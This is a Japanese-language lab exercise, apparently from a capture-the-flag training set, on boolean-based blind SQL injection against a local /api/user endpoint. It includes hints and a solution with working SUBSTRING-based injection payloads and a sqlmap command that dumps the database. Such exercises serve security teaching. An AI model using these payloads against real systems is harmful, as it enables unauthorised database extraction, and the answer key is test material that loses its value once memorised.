# 04 - Boolean-based Blind Injection

`http://localhost:3004` の`/api/user?id=`は`{"found": true/false}`しか返さない。
データは一切表示されない。それでもDB内のflagを1文字ずつ抜き出せ。

## ヒント

<details><summary>ヒント1</summary>

`server.py`を見ろ。`id`はクォートで囲まれずそのままクエリに埋め込まれている
(「数値だから安全」という思い込み)。

</details>

<details><summary>ヒント2</summary>

`id=1`は`found:true`。`id=1 AND 1=2`は`found:false`になるはず。これが二値応答(boolean-blind)の
基本。真偽で分岐する条件をANDでつなげば、DBに任意の質問を「はい/いいえ」で聞ける。

</details>

<details><summary>ヒント3</summary>

`flags`テーブルのflagカラムを1文字ずつ`SUBSTRING`で切り出し、比較演算子(`=`, `>`, `<`)で
二分探索すれば手動でも現実的な回数で全文字を割り出せる。sqlmapの`--technique=B`を使ってもよい。

</details>

<details><summary>解答</summary>

存在確認の応用で1文字ずつ判定する:

```
id=1 AND (SELECT SUBSTRING(flag,1,1) FROM flags)='F'   -> found:true
id=1 AND (SELECT SUBSTRING(flag,1,1) FROM flags)='X'   -> found:false
```

これを`SUBSTRING(flag, N, 1)`のNを増やしながら全文字について繰り返せば
flag全体が復元できる。文字候補を`=`で全探索する代わりに`>`/`<`で二分探索すれば
1文字あたりの試行回数をASCII 7bit分(約7回)まで減らせる。

sqlmapを使う場合:
```
sqlmap -u "http://localhost:3004/api/user?id=1" --technique=B \
  --string="found\":true" -p id --dump
```

</details>
